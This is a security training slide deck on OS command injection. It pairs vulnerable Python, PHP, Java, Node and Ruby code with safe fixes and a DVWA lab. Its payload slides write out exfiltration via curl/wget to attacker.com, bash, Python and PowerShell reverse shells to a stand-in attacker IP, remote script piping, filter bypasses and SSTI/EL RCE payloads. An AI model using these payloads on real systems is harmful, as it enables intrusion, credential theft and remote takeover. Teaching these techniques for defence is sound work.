---
tags:
  - security:security
  - security:web-security
  - security:penetration-testing
  - security:owasp
level: advanced
category: security
audience:
  - audiences:developers
  - audiences:security-professionals

---

# OS Command Injection

## Day 4: Executing System Commands Through Web Applications

---

## Day 4 Overview

| Session | Topic |
|---------|-------|
| Morning Part 1 | OS Command Injection |
| Morning Part 2 | File Path Manipulation & Deserialization |
| Afternoon Part 1 | Logic Flaws |
| Afternoon Part 2 | OS & Server Hardening |
| Late Afternoon | Web Server Hardening & Defense Labs |

---

## Command Injection Flow

![command_injection_flow](svg/courses/security/web-application-hacking/14_os_command_injection/command_injection_flow.svg)

---

## What is OS Command Injection?

OS command injection occurs when an application passes user input to a system shell command without proper sanitization.

```python
# VULNERABLE Python code
import os
domain = request.form['domain']
result = os.popen('nslookup ' + domain).read()
# User input: ; cat /etc/passwd
# Executed: nslookup ; cat /etc/passwd

# VULNERABLE PHP code
$ip = $_POST['ip'];
$output = shell_exec('ping -c 4 ' . $ip);
// User input: ; whoami
// Executed: ping -c 4 ; whoami
```

---

## Command Injection Operators

```bash
# Semicolon - sequential execution
; whoami                    # Run whoami after first command

# Pipe - send output to next command
| cat /etc/passwd           # Pipe output to cat

# AND operator - run if first succeeds
&& whoami                   # Run if first command succeeds

# OR operator - run if first fails
|| whoami                   # Run if first command fails

# Background operator
& whoami                    # Run in background

# Backticks - command substitution
`whoami`                    # Execute and substitute output

# Dollar parentheses - command substitution
$(whoami)                   # Execute and substitute output

# Newline
%0a whoami                  # URL-encoded newline
```

---

## Blind Command Injection

```bash
# When command output is not displayed in the response

# Time-based detection
127.0.0.1; sleep 10         # 10-second delay = injectable

# DNS-based detection
127.0.0.1; nslookup attacker.com    # Check DNS logs

# Out-of-band via HTTP
127.0.0.1; curl https://attacker.com/$(whoami)
127.0.0.1; wget https://attacker.com/$(cat /etc/passwd | base64)

# File creation
127.0.0.1; echo "pwned" > /var/www/html/proof.txt
# Then access: https://target.com/proof.txt

# Redirect output to accessible file
127.0.0.1; whoami > /var/www/html/output.txt
```

---

## Command Injection - Real-World Scenarios

```python
# Scenario 1: Network diagnostic tools
ping_target = request.form['host']
os.system(f"ping -c 4 {ping_target}")

# Scenario 2: File operations
filename = request.form['file']
os.system(f"convert {filename} output.pdf")

# Scenario 3: Git operations
repo_url = request.form['url']
os.system(f"git clone {repo_url}")

# Scenario 4: Email sending
recipient = request.form['email']
os.system(f"sendmail {recipient} < message.txt")

# Scenario 5: DNS lookups
domain = request.form['domain']
os.system(f"dig {domain}")
```

---

## Command Injection Exploitation

```bash
# Once you have command execution:

# 1. System information
; uname -a
; cat /etc/os-release
; id
; whoami

# 2. Network information
; ifconfig
; netstat -tlnp
; cat /etc/hosts

# 3. File system exploration
; ls -la /
; find / -name "*.conf" -type f 2>/dev/null
; cat /etc/shadow

# 4. Reverse shell
; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 5. Download additional tools
; curl https://attacker.com/tool.sh | bash
```

---

## Commix - Automated Command Injection

```bash
# Commix is an automated command injection tool

# Basic usage
commix -u "http://target.com/ping?ip=127.0.0.1" --batch

# POST data
commix -u "http://target.com/ping" \
  --data="ip=127.0.0.1" --batch

# From Burp request
commix -r request.txt --batch

# Specify injection technique
# Classic, Eval-based, Time-based, File-based
commix -u "http://target.com/ping?ip=127.0.0.1" \
  --technique=c --batch

# Get a pseudo-shell
commix -u "http://target.com/ping?ip=127.0.0.1" \
  --os-cmd="whoami"
```

---

## Bypassing Command Injection Filters

```bash
# Filter: Blocks semicolons and pipes
# Bypass: Use newline
%0a whoami

# Filter: Blocks spaces
# Bypass: Use ${IFS} (Internal Field Separator)
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}           # Brace expansion
;cat</etc/passwd             # Input redirection

# Filter: Blocks specific commands (e.g., 'cat')
# Bypass: Use alternatives
;tac /etc/passwd             # Reverse cat
;head /etc/passwd
;tail /etc/passwd
;less /etc/passwd
;more /etc/passwd
;nl /etc/passwd              # Number lines
;sort /etc/passwd
;xxd /etc/passwd             # Hex dump
;base64 /etc/passwd          # Base64 encode

# Filter: Blocks 'etc' or 'passwd'
;cat /e?c/p?sswd             # Wildcards
;cat /e${empty}tc/passwd     # Variable insertion
```

---

## Preventing Command Injection

```python
# BEST: Avoid calling system commands entirely
# Use language-native libraries instead

# Instead of: os.system(f"ping {ip}")
import subprocess
# GOOD: Use list arguments (no shell interpretation)
result = subprocess.run(
    ['ping', '-c', '4', ip],
    capture_output=True, text=True,
    shell=False  # CRITICAL: shell=False
)

# Instead of: os.system(f"nslookup {domain}")
import dns.resolver
answers = dns.resolver.resolve(domain, 'A')

# Instead of: os.system(f"convert {file} output.pdf")
from PIL import Image
img = Image.open(file)
img.save('output.pdf')

# If you MUST use shell commands:
import shlex
safe_input = shlex.quote(user_input)  # Escapes shell metacharacters
```

---

## Command Injection in Different Languages

```java
// Java - Runtime.exec
String ip = request.getParameter("ip");
Runtime.getRuntime().exec("ping " + ip);  // VULNERABLE

// SECURE: Use ProcessBuilder with argument list
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
Process p = pb.start();

// PHP
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // VULNERABLE
exec("ping -c 4 " . $ip);    // VULNERABLE

// SECURE: escapeshellarg
system("ping -c 4 " . escapeshellarg($ip));

// Node.js
const { exec } = require('child_process');
exec('ping -c 4 ' + ip);  // VULNERABLE

// SECURE: Use execFile with arguments
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', ip], callback);

// Ruby
system("ping -c 4 #{ip}")  // VULNERABLE
system("ping", "-c", "4", ip)  // SECURE (array form)
```

---

## Windows Command Injection

```bash
# Windows uses different operators and commands

# Command chaining
& whoami                    # Run after (always)
&& whoami                   # Run if first succeeds
|| whoami                   # Run if first fails
| whoami                    # Pipe output

# Common Windows recon commands
& whoami
& hostname
& ipconfig /all
& net user
& net localgroup administrators
& systeminfo
& tasklist
& dir c:\

# PowerShell payloads
& powershell -c "whoami"
& powershell -enc [Base64EncodedCommand]

# Reverse shell (PowerShell)
& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

## Template Injection (SSTI)

```python
# Server-Side Template Injection - related to command injection
# User input is rendered as a template expression

# Jinja2 (Python/Flask)
# VULNERABLE:
template = f"Hello {user_input}"
return render_template_string(template)

# Detection payloads:
{{7*7}}              # Returns 49 if injectable
{{config}}           # Dumps Flask config
{{config.items()}}   # Lists all config items

# RCE via Jinja2:
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen or os module in subclasses

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Detection: Submit {{7*7}} and check if output is 49
# Tools: tplmap for automated detection
```

---

## Expression Language Injection

```java
// Expression Language (EL) Injection - Java
// Spring Framework, JSP, JSF use expression languages

// VULNERABLE: User input in EL expression
String expr = "${" + userInput + "}";
// If userInput = "7*7" -> evaluates to 49

// RCE via EL Injection:
${Runtime.getRuntime().exec("whoami")}

// Spring Expression Language (SpEL):
${T(java.lang.Runtime).getRuntime().exec('whoami')}

// Detection payloads:
${7*7}        -> 49
#{7*7}        -> 49
${env}        -> Environment variables
${applicationScope}  -> Application attributes

// Prevention:
// - Never include user input in EL expressions
// - Use parameterized templates
// - Disable EL evaluation where not needed
```

---

## Code Injection vs Command Injection

```misc
Code Injection:
  Attacker injects CODE in the application's language
  Example: eval(user_input)  in PHP/Python/JS
  The injected code runs WITHIN the application

Command Injection:
  Attacker injects OS COMMANDS
  Example: system(user_input)  calls the OS shell
  The injected command runs OUTSIDE the application

Code Injection examples:
  PHP:    eval('return ' . $_GET['calc'] . ';');
  Python: eval(request.args.get('expr'))
  Node:   eval(req.query.code)

Both are critical - but code injection may not
need OS access to be devastating
(can access application data, secrets, etc.)
```

---

## Lab: DVWA Command Injection

```bash
# Low security - no filtering
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1 && id

# Medium security - strips ; and &&
127.0.0.1 | whoami           # Pipe still works
127.0.0.1 || whoami          # OR still works

# High security - strips most operators (but with whitespace bugs)
127.0.0.1|whoami             # No space before pipe

# Impossible - uses strict validation
# Only allows digits and dots (IP address format)
```

---

## DVWA Source Code Comparison

```php
// LOW: No filtering at all
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);

// MEDIUM: Blacklist ; and &&
$substitutions = array('&&' => '', ';' => '');
$target = str_replace(array_keys($substitutions),
                      $substitutions, $_REQUEST['ip']);

// HIGH: Blacklist more operators (note the spaces!)
$substitutions = array(
    '&'  => '', ';'  => '', '| ' => '',  // Note: "| " not "|"
    '-'  => '', '$'  => '', '('  => '',
    ')'  => '', '`'  => '', '||' => ''
);

// IMPOSSIBLE: Strict whitelist validation
$octet = explode(".", $target);
if ((is_numeric($octet[0])) && (is_numeric($octet[1]))
 && (is_numeric($octet[2])) && (is_numeric($octet[3]))
 && (sizeof($octet) == 4)) {
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
    $cmd = shell_exec('ping -c 4 ' . $target);
}
// Only accepts numeric octets separated by dots
```

---

## Command Injection Prevention Checklist

```misc
[ ] Inventory all system/exec/shell calls in codebase
[ ] Replace with language-native libraries where possible
[ ] Use parameterized command execution (array form)
[ ] Set shell=False in subprocess calls
[ ] Validate input against strict whitelist patterns
[ ] Escape special characters as secondary defense
[ ] Use least-privilege OS user for the application
[ ] Implement AppArmor/SELinux profiles
[ ] Monitor for unexpected process creation
[ ] Log all command executions for audit
[ ] Apply WAF rules for command injection patterns
[ ] Regular code review for new shell call introductions
```

---

## Summary

- OS command injection gives attackers full system access
- Multiple operators can chain commands: `;`, `|`, `&&`, `||`, backticks
- Blind injection detected via timing, DNS, or file creation
- `Commix` automates detection and exploitation
- **Best defense**: Avoid shell commands, use language libraries
- If unavoidable: use parameterized commands (no shell)
- Input validation and escaping as secondary defenses

> Next: File Path Manipulation & Deserialization
